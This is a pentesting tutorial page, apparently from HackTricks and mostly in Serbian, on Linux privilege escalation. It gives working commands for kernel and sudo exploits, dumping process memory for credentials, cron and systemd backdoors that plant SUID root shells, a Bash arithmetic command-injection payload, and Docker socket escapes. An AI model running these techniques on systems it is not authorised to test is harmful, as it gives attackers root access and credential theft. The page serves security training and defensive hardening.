# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Informacije o sistemu

### OS info

Počnimo sa prikupljanjem informacija o pokrenutom OS-u
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

Ako imate dozvole za upis u bilo koji folder unutar promenljive `PATH`, možda ćete moći da hijack neke libraries ili binaries:
```bash
echo $PATH
```
### Informacije o okruženju

Zanimljive informacije, lozinke ili API ključevi u varijablama okruženja?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Proverite verziju kernela i da li postoji neki exploit koji se može iskoristiti za eskalaciju privilegija
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Možete pronaći dobar spisak ranjivih kernel verzija i neke već **compiled exploits** ovde: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) and [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Drugi sajtovi na kojima možete pronaći neke **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Da biste izvukli sve ranjive kernel verzije sa te stranice možete uraditi:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Alati koji mogu pomoći pri pretrazi kernel exploits su:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (execute IN victim, samo proverava exploits za kernel 2.x)

Uvek **pretražite kernel verziju na Google-u**, možda je vaša kernel verzija navedena u nekom kernel exploit-u i tada ćete biti sigurni da je taj exploit validan.

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo verzija

Na osnovu ranjivih verzija sudo koje se pojavljuju u:
```bash
searchsploit sudo
```
Možete proveriti da li je sudo verzija ranjiva koristeći ovaj grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.8.28

Od @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg verifikacija potpisa nije uspela

Pogledajte **smasher2 box of HTB** za **primer** kako bi ovaj vuln mogao biti iskorišćen
```bash
dmesg 2>/dev/null | grep "signature"
```
### Više sistemske enumeracije
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Navedite moguće odbrane

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Ako se nalazite unutar docker container-a, možete pokušati da iz njega pobegnete:


{{#ref}}
docker-security/
{{#endref}}

## Diskovi

Proverite **šta je mounted i unmounted**, gde i zašto. Ako je nešto unmounted, možete pokušati da ga mount-ujete i proverite privatne informacije
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Korisni softver

Nabroj korisne binarne datoteke
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Takođe, proverite da li je instaliran **bilo koji kompajler**. Ovo je korisno ako treba da koristite neki kernel exploit, jer se preporučuje da ga kompajlirate na mašini na kojoj ćete ga koristiti (ili na nekoj sličnoj)
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Instaliran ranjiv softver

Proverite **verziju instaliranih paketa i servisa**. Možda postoji neka stara verzija Nagios-a (na primer) koja bi mogla da bude iskorišćena za escalating privileges…\  
Preporučuje se ručno proveriti verziju najsumnjivijeg instaliranog softvera.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
If you have SSH access to the machine you could also use **openVAS** to check for outdated and vulnerable software installed inside the machine.

> [!NOTE] > _Imajte na umu da će ove komande prikazati puno informacija koje će većinom biti beskorisne, zato se preporučuje korišćenje aplikacija poput OpenVAS ili sličnih koje će proveriti da li je neka verzija instaliranog softvera ranjiva na poznate exploits_

## Processes

Pogledajte **koji se procesi** izvršavaju i proverite da li neki proces ima **više privilegija nego što bi trebalo** (možda tomcat koji se izvršava kao root?)
```bash
ps aux
ps -ef
top -n 1
```
Uvek proveri moguće [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** ih detektuje proverom `--inspect` parametra u komandnoj liniji procesa.\
Takođe, **proveri svoje privilegije nad binarnim fajlovima procesa**, možda možeš prepisati tuđi.

### Process monitoring

Možeš koristiti alate kao što je [**pspy**](https://github.com/DominicBreuker/pspy) za praćenje procesa. Ovo može biti veoma korisno za identifikovanje ranjivih procesa koji se često izvršavaju ili kada su ispunjeni određeni uslovi.

### Process memory

Neki servisi na serveru čuvaju **credentials u čistom tekstu u memoriji**.\
Obično će ti trebati **root privileges** da pročitaš memoriju procesa koji pripadaju drugim korisnicima, zato je ovo obično korisnije kada si već root i želiš otkriti više credentials.\
Međutim, zapamti da **kao običan korisnik možeš čitati memoriju procesa koje poseduješ**.

> [!WARNING]
> Imaj na umu da većina mašina danas **po defaultu ne dozvoljava ptrace**, što znači da ne možeš dump-ovati druge procese koji pripadaju tvom neprivilegovanom korisniku.
>
> Fajl _**/proc/sys/kernel/yama/ptrace_scope**_ kontroliše pristupačnost ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: svi procesi mogu biti debugovani, ako imaju isti uid. Ovo je klasičan način na koji je ptracing radio.
> - **kernel.yama.ptrace_scope = 1**: samo parent process može biti debugovan.
> - **kernel.yama.ptrace_scope = 2**: Samo admin može koristiti ptrace, jer zahteva CAP_SYS_PTRACE capability.
> - **kernel.yama.ptrace_scope = 3**: Nijedan proces ne može biti traziran ptrace-om. Jednom postavljeno, potreban je reboot da bi se ptrace ponovo omogućio.

#### GDB

Ako imaš pristup memoriji FTP servisa (na primer), možeš izvući Heap i pretražiti njegove credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB skripta
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Za dati ID procesa, **maps pokazuju kako je memorija mapirana unutar virtuelnog adresnog prostora tog procesa**; takođe pokazuju **dozvole svake mapirane regije**. Pseudo fajl **mem** **izlaže samu memoriju procesa**. Iz **maps** fajla znamo koje **regije memorije su čitljive** i njihove offsete. Koristimo ove informacije da **pozicioniramo se u mem fajlu i iskopiramo sve čitljive regije** u fajl.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` obezbeđuje pristup **fizičkoj** memoriji sistema, a ne virtuelnoj memoriji. Virtuelni adresni prostor kernela može se pristupiti pomoću /dev/kmem.\
Obično je `/dev/mem` čitljiv samo za **root** i **kmem** grupu.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

ProcDump je Linux implementacija klasičnog alata ProcDump iz Sysinternals paketa alata za Windows. Dostupan je na [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Alati

Za dump memorije procesa možete koristiti:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Možete ručno ukloniti zahteve za root i napraviti dump procesa koji je u vašem vlasništvu
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root je potreban)

### Credentials from Process Memory

#### Ručni primer

Ako otkrijete da proces authenticator radi:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Možete dump the process (pogledajte prethodne sekcije da biste pronašli različite načine za dump the memory of a process) i pretražiti credentials unutar memory:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Alat [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) će **ukrasti clear text credentials iz memorije** i iz nekih **poznatih fajlova**. Potrebne su root privilegije da bi ispravno radio.

| Feature                                           | Process Name         |
| ------------------------------------------------- | -------------------- |
| GDM lozinka (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (aktivne FTP konekcije)                    | vsftpd               |
| Apache2 (aktivne HTTP Basic Auth sesije)         | apache2              |
| OpenSSH (aktivne SSH sesije - korišćenje sudo)   | sshd:                |

#### Pretraga Regex-ova/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Zakazani/Cron zadaci

### Crontab UI (alseambusher) koji radi kao root – web-based scheduler privesc

Ako web panel “Crontab UI” (alseambusher/crontab-ui) radi kao root i vezan je samo na loopback, i dalje mu možete pristupiti preko SSH lokalnog prosljeđivanja portova (local port-forwarding) i kreirati privilegovani zadatak za eskalaciju.

Tipičan lanac
- Pronađite port dostupan samo na loopback-u (npr., 127.0.0.1:8000) i Basic-Auth realm pomoću `ss -ntlp` / `curl -v localhost:8000`
- Pronađite kredencijale u operativnim artefaktima:
- Backups/scripts with `zip -P <password>`
- systemd unit koji izlaže `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Tunelovanje i prijava:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Kreiraj high-priv job i pokreni odmah (ostavlja SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Koristi ga:
```bash
/tmp/rootshell -p   # root shell
```
Hardening
- Ne pokrećite Crontab UI kao root; ograničite ga na dedikovanog korisnika i minimalna prava
- Vežite na localhost i dodatno ograničite pristup putem firewall/VPN; ne koristite iste lozinke ponovo
- Izbegavajte ugrađivanje tajni u unit files; koristite secret stores ili root-only EnvironmentFile
- Omogućite audit/logging za izvršavanje job-ova po zahtevu



Proverite da li je neki zakazani job ranjiv. Možda možete iskoristiti skriptu koja se izvršava kao root (wildcard vuln? možete li modifikovati fajlove koje root koristi? use symlinks? kreirati specifične fajlove u direktorijumu koji root koristi?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron putanja

Na primer, u fajlu _/etc/crontab_ možeš pronaći PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Pogledaj kako korisnik "user" ima privilegije za pisanje nad /home/user_)

Ako u ovom crontab fajlu root pokuša da izvrši neku komandu ili skript bez postavljanja PATH-a. Na primer: _\* \* \* \* root overwrite.sh_\
Tada možeš dobiti root shell koristeći:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron koji pokreće skriptu sa wildcard-om (Wildcard Injection)

Ako skripta koju izvršava root sadrži “**\***” u komandi, to možete iskoristiti za izvođenje neočekivanih stvari (poput privesc). Primer:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Ako se wildcard nalazi nakon putanje kao** _**/some/path/\***_ **, nije ranjiv (čak ni** _**./\***_ **nije).**

Pročitajte sledeću stranicu za više wildcard exploitation trikova:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash performs parameter expansion and command substitution before arithmetic evaluation in ((...)), $((...)) and let. Ako root cron/parser čita nepouzdana polja iz loga i ubacuje ih u an arithmetic context, napadač može ubaciti command substitution $(...) koji se izvršava kao root kada cron pokrene.

- Zašto funkcioniše: U Bash-u, expansions se dešavaju u sledećem redosledu: parameter/variable expansion, command substitution, arithmetic expansion, zatim word splitting i pathname expansion. Dakle vrednost kao `$(/bin/bash -c 'id > /tmp/pwn')0` se prvo substituted (pokreće komandu), zatim preostali numerički `0` se koristi za arithmetic pa skripta nastavlja bez grešaka.

- Tipičan ranjiv obrazac:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: Naterajte da tekst pod kontrolom napadača bude upisan u parsirani log tako da numeričko-polje sadrži command substitution i završava cifrom. Osigurajte da vaša komanda ne ispisuje na stdout (ili je preusmerite) kako bi arithmetic ostala validna.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

Ako **možete izmeniti cron script** koji se izvršava kao root, vrlo lako možete dobiti shell:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Ako skripta koju izvršava root koristi **direktorijum na koji imate potpuni pristup**, možda bi bilo korisno obrisati taj direktorijum i **kreirati symlink direktorijum ka drugom** koji će služiti skriptu kojom upravljate.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Česti cron jobs

Možete nadgledati procese da biste tražili procese koji se izvršavaju na svake 1, 2 ili 5 minuta. Možda možete iskoristiti to i escalate privileges.

Na primer, da biste **nadgledali svakih 0.1s tokom 1 minute**, **sortirali po komandama koje su najmanje izvršavane** i obrisali komande koje su najviše izvršavane, možete uraditi:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Takođe možete koristiti** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (ovo će nadgledati i nabrojati svaki proces koji se pokrene).

### Nevidljivi cron jobs

Moguće je napraviti cronjob **stavljanjem carriage return-a nakon komentara** (bez znaka novog reda), i cron job će raditi. Primer (obratite pažnju na carriage return karakter):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Servisi

### Upisivi _.service_ files

Proverite da li možete da upišete bilo koji `.service` fajl, ako možete, vi **možete da ga izmenite** tako da **izvršava** vaš **backdoor kada** se servis **pokrene**, **restartuje** ili **zaustavi** (možda ćete morati da sačekate da se mašina restartuje).\
Na primer, kreirajte vaš backdoor unutar .service fajla sa **`ExecStart=/tmp/script.sh`**

### Upisivi binarni fajlovi servisa

Imajte na umu da ako imate **dozvole za pisanje nad binarnim fajlovima koje izvršavaju servisi**, možete ih promeniti u backdoors, tako da kada se servisi ponovo izvrše backdoors budu izvršeni.

### systemd PATH - Relative Paths

Možete videti PATH koji koristi **systemd** sa:
```bash
systemctl show-environment
```
Ako otkrijete da možete **write** u bilo kojem od direktorijuma na putanji, možda ćete moći **escalate privileges**. Treba da tražite **relative paths being used on service configurations** u fajlovima kao što su:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Zatim, kreirajte **izvršni fajl** sa **istim imenom kao relativni put binarnog fajla** unutar systemd PATH foldera u koji možete da pišete, i kada se servisu zatraži da izvrši ranjivu akciju (**Start**, **Stop**, **Reload**), vaš **backdoor će biti izvršen** (neprivilegovani korisnici obično ne mogu da startuju/zaustave servise, ali proverite da li možete da koristite `sudo -l`).

**Saznajte više o servisima pomoću `man systemd.service`.**

## **Timers**

**Timers** su systemd unit fajlovi čije ime se završava na `**.timer**` i koji kontrolišu `**.service**` fajlove ili događaje. **Timers** se mogu koristiti kao alternativa cron-u, pošto imaju ugrađenu podršku za događaje zasnovane na kalendarskom vremenu i za događaje zasnovane na monotoničkom vremenu, i mogu se pokretati asinhrono.

Možete izlistati sve timere pomoću:
```bash
systemctl list-timers --all
```
### Tajmeri koji se mogu menjati

Ako možete izmeniti tajmer, možete ga naterati da izvrši neke jedinice systemd.unit (kao što su `.service` ili `.target`).
```bash
Unit=backdoor.service
```
U dokumentaciji možete pročitati šta je Unit:

> Jedinica koja se aktivira kada ovaj timer istekne. Argument je naziv jedinice, čiji sufiks nije ".timer". Ako nije navedeno, ova vrednost podrazumevano upućuje na servis koji ima isto ime kao timer jedinica, osim sufiksa. (Vidi gore.) Preporučuje se da naziv jedinice koja se aktivira i naziv timer jedinice budu identični, osim sufiksa.

Dakle, da biste zloupotrebili ovu privilegiju, morate:

- Pronaći neku systemd unit (npr. `.service`) koja **izvršava binarni fajl nad kojim imate prava za pisanje**
- Pronaći neku systemd unit koja **izvršava relativnu putanju** i nad kojom imate **prava za pisanje** u **systemd PATH** (da biste se predstavili kao taj izvršni fajl)

**Saznajte više o timer-ima koristeći `man systemd.timer`.**

### **Omogućavanje tajmera**

Da biste omogućili tajmer, potrebne su vam root privilegije i da izvršite:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Note the **timer** is **activated** by creating a symlink to it on `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) enable **process communication** on the same or different machines within client-server models. They utilize standard Unix descriptor files for inter-computer communication and are set up through `.socket` files.

Sockets can be configured using `.socket` files.

**Learn more about sockets with `man systemd.socket`.** Inside this file, several interesting parameters can be configured:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: These options are different but a summary is used to **indicate where it is going to listen** to the socket (the path of the AF_UNIX socket file, the IPv4/6 and/or port number to listen, etc.)
- `Accept`: Takes a boolean argument. If **true**, a **service instance is spawned for each incoming connection** and only the connection socket is passed to it. If **false**, all listening sockets themselves are **passed to the started service unit**, and only one service unit is spawned for all connections. This value is ignored for datagram sockets and FIFOs where a single service unit unconditionally handles all incoming traffic. **Defaults to false**. For performance reasons, it is recommended to write new daemons only in a way that is suitable for `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Takes one or more command lines, which are **executed before** or **after** the listening **sockets**/FIFOs are **created** and bound, respectively. The first token of the command line must be an absolute filename, then followed by arguments for the process.
- `ExecStopPre`, `ExecStopPost`: Additional **commands** that are **executed before** or **after** the listening **sockets**/FIFOs are **closed** and removed, respectively.
- `Service`: Specifies the **service** unit name **to activate** on **incoming traffic**. This setting is only allowed for sockets with Accept=no. It defaults to the service that bears the same name as the socket (with the suffix replaced). In most cases, it should not be necessary to use this option.

### Upisivi .socket fajlovi

Ako nađete a **writable** `.socket` file you can **add** at the beginning of the `[Socket]` section something like: `ExecStartPre=/home/kali/sys/backdoor` and the backdoor will be executed before the socket is created. Therefore, you will **probably need to wait until the machine is rebooted.**\
_Napomena: sistem mora koristiti tu konfiguraciju socket fajla ili backdoor neće biti izvršen_

### Writable sockets

Ako **identify any writable socket** (_now we are talking about Unix Sockets and not about the config `.socket` files_), then **you can communicate** with that socket and maybe exploit a vulnerability.

### Enumeracija Unix Sockets
```bash
netstat -a -p --unix
```
### Sirova veza
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Primer eksploatacije:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Imajte na umu da može postojati nekoliko **sockets koji slušaju HTTP zahteve** (_Ne mislim na .socket files već na datoteke koje funkcionišu kao unix sockets_). Možete to proveriti sa:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Ako socket **odgovara na HTTP** zahtev, onda možete **komunicirati** sa njim i možda **exploit some vulnerability**.

### Upisivi Docker Socket

Docker socket, često se nalazi na `/var/run/docker.sock`, predstavlja kritičan fajl koji treba biti zaštićen. Po defaultu, dozvoljen je za upis od strane `root` korisnika i članova `docker` grupe. Imanje write access-a na ovom socketu može dovesti do privilege escalation. Evo pregleda kako se to može uraditi i alternativne metode ako Docker CLI nije dostupan.

#### **Privilege Escalation with Docker CLI**

Ako imate write access to the Docker socket, možete escalate privileges koristeći sledeće komande:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Ove komande vam omogućavaju da pokrenete kontejner sa root pristupom fajl sistemu hosta.

#### **Direktno korišćenje Docker API-ja**

U slučajevima kada Docker CLI nije dostupan, Docker socket se i dalje može manipulisati koristeći Docker API i `curl` komande.

1.  **List Docker Images:** Dohvatite listu dostupnih slika.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Pošaljite zahtev za kreiranje kontejnera koji montira root direktorijum host sistema.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Start the newly created container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Koristite `socat` da uspostavite konekciju ka kontejneru, omogućavajući izvršavanje komandi unutar njega.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Nakon uspostavljanja `socat` konekcije, možete direktno izvršavati komande u kontejneru sa root pristupom fajl sistemu hosta.

### Ostalo

Imajte na umu da ako imate write permissions nad docker socket-om zato što ste **inside the group `docker`** imate [**više načina za eskalaciju privilegija**](interesting-groups-linux-pe/index.html#docker-group). Ako [**docker API osluškuje na portu** možete takođe moći da ga kompromitujete](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Pogledajte **više načina da pobegnete iz docker-a ili da ga zloupotrebite za eskalaciju privilegija** u:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) eskalacija privilegija

Ako otkrijete da možete koristiti komandu **`ctr`** pročitajte sledeću stranicu jer **možda možete to zloupotrebiti za eskalaciju privilegija**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** eskalacija privilegija

Ako otkrijete da možete koristiti komandu **`runc`** pročitajte sledeću stranicu jer **možda možete to zloupotrebiti za eskalaciju privilegija**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus je sofisticiran sistem za inter-procesnu komunikaciju (IPC) koji omogućava aplikacijama da efikasno međusobno komuniciraju i dele podatke. Dizajniran sa savremenim Linux sistemom na umu, nudi robustan okvir za različite oblike komunikacije između aplikacija.

Sistem je svestran, podržava osnovni IPC koji unapređuje razmenu podataka između procesa, podsećajući na **enhanced UNIX domain sockets**. Pored toga, pomaže u emitovanju događaja ili signala, podstičući besprekornu integraciju među komponentama sistema. Na primer, signal od Bluetooth daemona o dolaznom pozivu može naterati plejer da utiša zvuk, poboljšavajući korisničko iskustvo. Dodatno, D-Bus podržava sistem udaljenih objekata, pojednostavljujući zahteve za servisima i pozive metoda između aplikacija, što pojednostavljuje procese koji su nekada bili složeni.

D-Bus radi po modelu **allow/deny**, upravljajući dozvolama za poruke (pozivi metoda, emitovanje signala, itd.) na osnovu kumulativnog efekta odgovarajućih policy pravila. Ove politike specificiraju interakcije sa bus-om, što potencijalno može dozvoliti eskalaciju privilegija kroz zloupotrebu ovih dozvola.

Primer takve politike u `/etc/dbus-1/system.d/wpa_supplicant.conf` je dat, navodeći dozvole za korisnika root da poseduje, šalje i prima poruke od `fi.w1.wpa_supplicant1`.

Politike bez specificiranog korisnika ili grupe važe univerzalno, dok se politike u "default" kontekstu primenjuju na sve koji nisu pokriveni drugim specifičnim politikama.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Saznajte kako da enumerate i exploit D-Bus komunikaciju ovde:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Mreža**

Uvek je zanimljivo enumerate mrežu i utvrditi poziciju mašine.

### Generička enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Otvoreni portovi

Uvek proverite mrežne servise koji rade na mašini sa kojima niste mogli da komunicirate pre nego što joj pristupite:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Proverite da li možete da sniff traffic. Ako možete, mogli biste da grab some credentials.
```
